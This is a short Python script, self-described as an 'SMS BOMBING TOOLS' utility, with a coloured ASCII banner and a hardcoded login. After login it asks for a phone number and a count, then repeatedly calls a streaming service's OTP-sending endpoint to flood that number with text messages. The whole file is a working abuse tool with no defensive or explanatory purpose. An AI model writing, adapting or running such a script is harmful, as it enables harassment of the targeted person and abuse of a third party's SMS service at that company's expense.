import requests
import random
import sys
import time
blue= '\33[94m'
lightblue= '\33[94m'
red= '\33[91m'
white= '\33[97m'
yellow= '\33[93m'
green= '\33[1;32m'
cyan= '\33[0m'

logo=green+str("""

\33[93m██████╗░██████╗░██╗░░░██╗░░███╗░░██╗░░░░░
██╔══██╗╚════██╗██║░░░██║░████║░░██║░░░░░"\33[91m
██║░░██║░█████╔╝╚██╗░██╔╝██╔██║░░██║░░░░░
"\33[1;32m██║░░██║░╚═══██╗░╚████╔╝░╚═╝██║░░██║░░░░░
██████╔╝██████╔╝░░╚██╔╝░░███████╗███████╗
╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚══════╝"\33[97m

\33[97m Hey Buddy,You Call Me DEVIL.
\33[1;32mSMS BOMBING TOOLS
\33[91m──────────────────────────────────────────────────
\33[93m▸ AUTHOR     : Adnan Adif Hisham
\33[1;32m▸ FACEBOOK   : Facebook.com/call.me.devil.2004
\33[91m▸ GITHUB     : GITHUB.COM/C4LLM3D3V1L
\33[91m──────────────────────────────────────────────────

""")

print(logo)

usern="DEVIL"
passwd="Hisham"



inpuser=str(input("•\33[93mEnter Username:-\33[91m"))
inppass=str(input("•\33[91mEnter Password:-\33[93m"))

if usern==inpuser and passwd==inppass:
	print("\33[1;32m[√] Login Successful Devil")
	pass
	
else:
		print("\33[91m[×] Wrong Username or Password")
		sys.exit()
#get
print("\33[1;32m──────────────────────────────────────────────────")
number=str(input("\33[97mEnter Your Number :-"))
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

amount=int(input("\33[97m Your Amount :-"))

print("──────────────────────────────────────────────────")

for i in range(amount):
	requests.get(api)
	print(str(i+1)+"\33[1;32m[√] SMS SENT")
